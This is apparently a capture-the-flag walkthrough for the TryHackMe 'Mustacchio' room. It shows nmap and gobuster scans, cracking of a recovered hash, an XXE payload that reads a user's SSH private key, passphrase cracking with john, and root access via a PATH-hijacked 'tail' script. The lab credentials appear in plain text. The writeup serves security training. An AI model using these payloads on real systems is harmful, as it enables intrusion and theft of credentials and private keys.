# Mustacchio

**Room Link:** [https://tryhackme.com/room/mustacchio](https://tryhackme.com/room/mustacchio)

### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (181).png" alt=""><figcaption></figcaption></figure>





### Scan all ports

port 8765 found which is running nginx

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>





### TCP/80 - HTTP

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

There is a users.bak file in the custom folder

<figure><img src="../../.gitbook/assets/image (185).png" alt=""><figcaption></figcaption></figure>

It's a bit messy but it appears to be a username and password hash. I put it through crackstation

<figure><img src="../../.gitbook/assets/image (186).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (187).png" alt=""><figcaption></figcaption></figure>





### TCP/8765 - HTTP

```
gobuster dir -u http://$VICTIM:8765 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>





**Kali**

```
Username: admin
Password: bulldog19
```



<figure><img src="../../.gitbook/assets/image (189).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure>

### Initial Shell

In the source code there's two interesting places to look

<figure><img src="../../.gitbook/assets/image (190).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (191).png" alt=""><figcaption></figcaption></figure>

Seems like a waste but we now know the format how to submit something on the site

<figure><img src="../../.gitbook/assets/image (192).png" alt=""><figcaption></figcaption></figure>

**Input**

```
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could\u2019ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could\u2019ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```

<figure><img src="../../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>

**Input**

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///home/barry/.ssh/id_rsa'>]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```

<figure><img src="../../.gitbook/assets/image (194).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (195).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (196).png" alt=""><figcaption></figcaption></figure>



**Kali**

```
python /opt/john/ssh2john.py id_rsa > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
chmod 600 id_rsa
ssh -v -i id_rsa barry@$VICTIM
Password: urieljames
```

<figure><img src="../../.gitbook/assets/image (197).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation

We find a program owned by root in joes folder. When we run strings on it we can see tail command is being ran but it is not using full path so we can exploit this.

**Victim**

```
cd /home/joe
ls -lah
strings live_log
```

<figure><img src="../../.gitbook/assets/image (198).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
cd /tmp

cat > tail << EOF
> #!/bin/bash
> /bin/bash -i
> EOF
chmod +x tail

export PATH=/tmp/:$PATH
/home/joe/live_log 
```

<figure><img src="../../.gitbook/assets/image (26) (1) (1).png" alt=""><figcaption></figcaption></figure>



















